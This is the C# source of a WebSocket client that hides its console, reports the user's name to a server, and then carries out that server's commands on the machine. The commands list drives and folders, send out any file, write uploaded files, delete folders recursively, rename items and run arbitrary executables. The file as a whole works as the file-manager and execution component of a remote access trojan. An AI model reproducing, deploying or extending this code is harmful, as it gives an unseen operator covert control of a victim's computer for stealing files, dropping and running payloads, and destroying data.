using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

public class OriginClient
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool FreeConsole();

    private ClientWebSocket ws;
    private string serverUrl = "ws://127.0.0.1:2222/";

    private bool uploadInProgress;
    private long uploadExpectedSize;
    private long uploadReceived;
    private FileStream uploadStream;
    private string uploadTargetPath;

    public static void Main(string[] args)
    {

        try { FreeConsole(); } catch { }
        string url = (args != null && args.Length > 0) ? args[0] : Environment.GetEnvironmentVariable("FILEMANAGER_WS");

        var client = new OriginClient();
        client.serverUrl = string.IsNullOrWhiteSpace(url) ? "ws://127.0.0.1:2222/" : url;
        client.Start().GetAwaiter().GetResult();
    }

    public async Task Start()
    {
        ws = new ClientWebSocket();
        try
        {
            FreeConsole();
            Console.WriteLine("Connecting to " + serverUrl);
            await ws.ConnectAsync(new Uri(serverUrl), CancellationToken.None);
            Console.WriteLine("Connected to server");

            SendMessage("AUTH", Environment.UserName);
            Console.WriteLine("AUTH sent: " + Environment.UserName);

            await ReceiveLoop();
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
            Console.WriteLine(ex.StackTrace);
        }
        finally
        {
            if (uploadStream != null)
            {
                uploadStream.Dispose();
                uploadStream = null;
                uploadInProgress = false;
            }

            try
            {
                if (ws != null && ws.State == WebSocketState.Open)
                    await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "bye", CancellationToken.None);
            }
            catch { }
        }
    }

    private async Task ReceiveLoop()
    {
        byte[] buffer = new byte[8192];
        while (ws.State == WebSocketState.Open)
        {
            var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
            if (result.MessageType == WebSocketMessageType.Close)
            {
                Console.WriteLine("Server closed connection");
                break;
            }

            if (result.MessageType == WebSocketMessageType.Binary)
            {
                await HandleUploadChunk(buffer, result.Count);
                continue;
            }

            string text = ReadTextMessage(result, buffer);
            if (!string.IsNullOrWhiteSpace(text))
                ProcessCommand(text);
        }
    }

    private string ReadTextMessage(WebSocketReceiveResult first, byte[] firstBuffer)
    {
        var builder = new StringBuilder();
        if (first.Count > 0)
            builder.Append(Encoding.UTF8.GetString(firstBuffer, 0, first.Count));

        var result = first;
        while (!result.EndOfMessage)
        {
            byte[] buffer = new byte[8192];
            result = ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None).GetAwaiter().GetResult();
            if (result.Count > 0)
                builder.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
        }

        return builder.ToString();
    }

    private void ProcessCommand(string json)
    {
        try
        {
            ClientCommand msg = ParseCommand(json);
            string type = msg.Type;
            string path = msg.Path;

            switch (type)
            {
                case "LIST":
                    SendDirectoryList(path);
                    break;
                case "DOWNLOAD":
                    _ = SendFile(path);
                    break;
                case "UPLOAD_START":
                    StartUpload(msg);
                    break;
                case "DELETE":
                    DeleteItem(path);
                    break;
                case "MKDIR":
                    CreateDirectory(path);
                    break;
                case "RENAME":
                    RenameItem(msg.OldPath, msg.NewPath);
                    break;
                case "EXEC":
                    ExecuteFile(path);
                    break;
                case "DISCONNECT":
                    ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Bye", CancellationToken.None).GetAwaiter().GetResult();
                    break;
                default:
                    // allow unknown messages without closing the socket
                    break;
            }
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", ex.Message);
        }
    }

    private static ClientCommand ParseCommand(string json)
    {
        var cmd = new ClientCommand();
        cmd.Type = (ReadJsonString(json, "type") ?? "").ToUpperInvariant();
        cmd.Path = ReadJsonString(json, "path") ?? string.Empty;
        cmd.Filename = ReadJsonString(json, "filename");
        cmd.OldPath = ReadJsonString(json, "old");
        cmd.NewPath = ReadJsonString(json, "new");

        string sizeText = ReadJsonNumberOrString(json, "size");
        cmd.SizeText = sizeText;

        return cmd;
    }

    private static string ReadJsonString(string json, string key)
    {
        if (string.IsNullOrEmpty(json) || string.IsNullOrEmpty(key))
            return null;

        var m = Regex.Match(json, "\"" + Regex.Escape(key) + "\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"", RegexOptions.IgnoreCase);
        if (!m.Success)
            return null;

        return UnescapeJsonString(m.Groups[1].Value);
    }

    private static string ReadJsonNumberOrString(string json, string key)
    {
        if (string.IsNullOrEmpty(json) || string.IsNullOrEmpty(key))
            return null;

        var stringMatch = Regex.Match(json, "\"" + Regex.Escape(key) + "\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"", RegexOptions.IgnoreCase);
        if (stringMatch.Success)
            return UnescapeJsonString(stringMatch.Groups[1].Value);

        var numMatch = Regex.Match(json, "\"" + Regex.Escape(key) + "\"\\s*:\\s*(-?\\d+)", RegexOptions.IgnoreCase);
        return numMatch.Success ? numMatch.Groups[1].Value : null;
    }

    private static string UnescapeJsonString(string value)
    {
        if (value == null)
            return null;

        return value.Replace("\\\"", "\"")
            .Replace("\\\\", "\\")
            .Replace("\\/", "/")
            .Replace("\\b", "\b")
            .Replace("\\f", "\f")
            .Replace("\\n", "\n")
            .Replace("\\r", "\r")
            .Replace("\\t", "\t");
    }

    private static string EscapeJsonString(string value)
    {
        if (value == null)
            return string.Empty;

        return value.Replace("\\", "\\\\")
            .Replace("\"", "\\\"")
            .Replace("\b", "\\b")
            .Replace("\f", "\\f")
            .Replace("\n", "\\n")
            .Replace("\r", "\\r")
            .Replace("\t", "\\t");
    }

    private static string BuildJsonObject(string type, string payload)
    {
        return string.Format(
            "{{\"type\":\"{0}\",\"payload\":\"{1}\",\"timestamp\":\"{2}\"}}",
            EscapeJsonString(type),
            EscapeJsonString(payload),
            EscapeJsonString(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff"))
        );
    }

    private sealed class ClientCommand
    {
        public string Type { get; set; }
        public string Path { get; set; }
        public string Filename { get; set; }
        public string SizeText { get; set; }
        public string OldPath { get; set; }
        public string NewPath { get; set; }
    }

    private void SendDirectoryList(string path)
    {
        try
        {
            bool showDriveRoot = string.IsNullOrWhiteSpace(path);
            if (showDriveRoot)
            {
                SendDriveList();
                return;
            }

            string fullPath = path;
            if (!Directory.Exists(fullPath))
            {
                SendMessage("ERROR", "Directory not found: " + fullPath);
                return;
            }

            fullPath = fullPath.TrimEnd();
            if (System.Text.RegularExpressions.Regex.IsMatch(fullPath, @"^[A-Za-z]:\\?$"))
                fullPath = fullPath.TrimEnd('\\') + "\\";

            var items = new List<Dictionary<string, object>>();

            foreach (string dir in Directory.EnumerateDirectories(fullPath))
            {
                var info = new DirectoryInfo(dir);
                try
                {
                    items.Add(new Dictionary<string, object>
                    {
                        { "name", info.Name },
                        { "path", info.FullName },
                        { "type", "dir" },
                        { "size", 0L },
                        { "modified", info.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") }
                    });
                }
                catch
                {
                    // Ignore entries that can't be queried in restricted folders.
                }
            }

            foreach (string file in Directory.EnumerateFiles(fullPath))
            {
                var info = new FileInfo(file);
                try
                {
                    items.Add(new Dictionary<string, object>
                    {
                        { "name", info.Name },
                        { "path", info.FullName },
                        { "type", "file" },
                        { "size", info.Length },
                        { "modified", info.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") }
                    });
                }
                catch
                {
                    // Ignore entries that can't be queried in restricted folders.
                }
            }

            var response = new StringBuilder();
            response.Append("{\"type\":\"LIST_RES\",\"items\":[");

            for (int i = 0; i < items.Count; i++)
            {
                var item = items[i];
                if (i > 0) response.Append(',');

                response.Append("{");
                response.AppendFormat("\"name\":\"{0}\",", EscapeJsonString(Convert.ToString(item["name"])));
                response.AppendFormat("\"path\":\"{0}\",", EscapeJsonString(Convert.ToString(item["path"])));
                response.AppendFormat("\"type\":\"{0}\",", EscapeJsonString(Convert.ToString(item["type"])));
                response.AppendFormat("\"size\":{0},", item["size"]);
                response.AppendFormat("\"modified\":\"{0}\"", EscapeJsonString(Convert.ToString(item["modified"])));
                response.Append("}");
            }

            response.Append("],\"timestamp\":\"");
            response.Append(EscapeJsonString(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff")));
            response.Append("\"}");

            SendText(response.ToString());
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", "List failed: " + ex.Message);
        }
    }

    private void SendDriveList()
    {
        try
        {
            var items = new List<Dictionary<string, object>>();

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (!drive.IsReady)
                    continue;

                items.Add(new Dictionary<string, object>
                {
                    { "name", drive.Name.TrimEnd('\\') },
                    { "path", drive.RootDirectory.FullName },
                    { "type", "dir" },
                    { "size", 0L },
                    { "modified", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") }
                });
            }

            var response = new StringBuilder();
            response.Append("{\"type\":\"LIST_RES\",\"items\":[");

            for (int i = 0; i < items.Count; i++)
            {
                var item = items[i];
                if (i > 0) response.Append(',');

                response.Append("{");
                response.AppendFormat("\"name\":\"{0}\",", EscapeJsonString(Convert.ToString(item["name"])));
                response.AppendFormat("\"path\":\"{0}\",", EscapeJsonString(Convert.ToString(item["path"])));
                response.AppendFormat("\"type\":\"{0}\",", EscapeJsonString(Convert.ToString(item["type"])));
                response.AppendFormat("\"size\":{0},", item["size"]);
                response.AppendFormat("\"modified\":\"{0}\"", EscapeJsonString(Convert.ToString(item["modified"])));
                response.Append("}");
            }

            response.Append("],\"timestamp\":\"");
            response.Append(EscapeJsonString(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff")));
            response.Append("\"}");

            SendText(response.ToString());
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", "Drive list failed: " + ex.Message);
        }
    }

    private async Task SendFile(string path)
    {
        try
        {
            if (!File.Exists(path))
            {
                SendMessage("ERROR", "File not found");
                return;
            }

            var info = new FileInfo(path);
            SendMessage("FILE_INFO", "{\"name\":\"" + EscapeJsonString(info.Name) + "\",\"size\":" + info.Length + "}");

            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read))
            {
                byte[] buffer = new byte[8192];
                int read;
                while ((read = await fs.ReadAsync(buffer, 0, buffer.Length)) > 0)
                {
                    await ws.SendAsync(new ArraySegment<byte>(buffer, 0, read), WebSocketMessageType.Binary, true, CancellationToken.None);
                }
            }

            SendMessage("TRANSFER_COMPLETE", "Download finished");
            Console.WriteLine("Sent file: " + path);
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", "Send failed: " + ex.Message);
        }
    }

    private void StartUpload(ClientCommand msg)
    {
        try
        {
            if (uploadInProgress && uploadStream != null)
            {
                uploadStream.Dispose();
                uploadStream = null;
                uploadInProgress = false;
            }

            string requestedPath = msg.Path;
            string filename = msg.Filename;
            string sizeValue = msg.SizeText;

            if (string.IsNullOrEmpty(requestedPath))
            {
                SendMessage("ERROR", "Upload path missing");
                return;
            }

            if (string.IsNullOrEmpty(filename))
            {
                SendMessage("ERROR", "Upload filename missing");
                return;
            }

            if (string.IsNullOrWhiteSpace(sizeValue) || !long.TryParse(sizeValue, out uploadExpectedSize) || uploadExpectedSize < 0)
            {
                SendMessage("ERROR", "Invalid upload size");
                return;
            }

            if (requestedPath.EndsWith("\\") || requestedPath.EndsWith("/"))
                requestedPath += filename;

            if (Directory.Exists(requestedPath))
                requestedPath = Path.Combine(requestedPath, filename);

            string dir = Path.GetDirectoryName(requestedPath);
            if (!string.IsNullOrWhiteSpace(dir) && !Directory.Exists(dir))
                Directory.CreateDirectory(dir);

            uploadStream = new FileStream(requestedPath, FileMode.Create, FileAccess.Write);
            uploadTargetPath = requestedPath;
            uploadInProgress = true;
            uploadReceived = 0;

            SendMessage("READY", "Start upload");
            Console.WriteLine("Upload started: " + requestedPath + " (" + uploadExpectedSize + " bytes)");
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", "Upload start failed: " + ex.Message);
        }
    }

    private async Task HandleUploadChunk(byte[] buffer, int count)
    {
        if (!uploadInProgress || uploadStream == null || count <= 0)
            return;

        await uploadStream.WriteAsync(buffer, 0, count, CancellationToken.None);
        uploadReceived += count;

        if (uploadReceived >= uploadExpectedSize)
        {
            uploadInProgress = false;
            string savedPath = uploadTargetPath;

            uploadStream.Dispose();
            uploadStream = null;
            uploadExpectedSize = 0;
            uploadReceived = 0;
            uploadTargetPath = null;

            SendMessage("UPLOAD_COMPLETE", savedPath);
            Console.WriteLine("Upload complete: " + savedPath);
        }
    }

    private void DeleteItem(string path)
    {
        try
        {
            if (File.Exists(path))
            {
                File.Delete(path);
                SendMessage("SUCCESS", "Deleted: " + path);
                return;
            }

            if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
                SendMessage("SUCCESS", "Deleted: " + path);
                return;
            }

            SendMessage("ERROR", "Not found: " + path);
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", ex.Message);
        }
    }

    private void CreateDirectory(string path)
    {
        try
        {
            Directory.CreateDirectory(path);
            SendMessage("SUCCESS", "Created: " + path);
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", ex.Message);
        }
    }

    private void RenameItem(string oldPath, string newPath)
    {
        try
        {
            if (File.Exists(oldPath))
            {
                File.Move(oldPath, newPath);
                SendMessage("SUCCESS", "Renamed");
                return;
            }

            if (Directory.Exists(oldPath))
            {
                Directory.Move(oldPath, newPath);
                SendMessage("SUCCESS", "Renamed");
                return;
            }

            SendMessage("ERROR", "Source not found");
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", ex.Message);
        }
    }

    private void ExecuteFile(string path)
    {
        try
        {
            if (!File.Exists(path))
            {
                SendMessage("ERROR", "File not found");
                return;
            }

            Process.Start(new ProcessStartInfo(path) { UseShellExecute = true });
            SendMessage("SUCCESS", "Executed");
        }
        catch (Exception ex)
        {
            SendMessage("ERROR", ex.Message);
        }
    }

    private void SendText(string text)
    {
        if (ws == null || ws.State != WebSocketState.Open)
            return;

        byte[] data = Encoding.UTF8.GetBytes(text);
        ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None).GetAwaiter().GetResult();
    }

    private void SendMessage(string type, string payload)
    {
        if (ws == null || ws.State != WebSocketState.Open)
            return;

        SendText(BuildJsonObject(type, payload));
    }
}
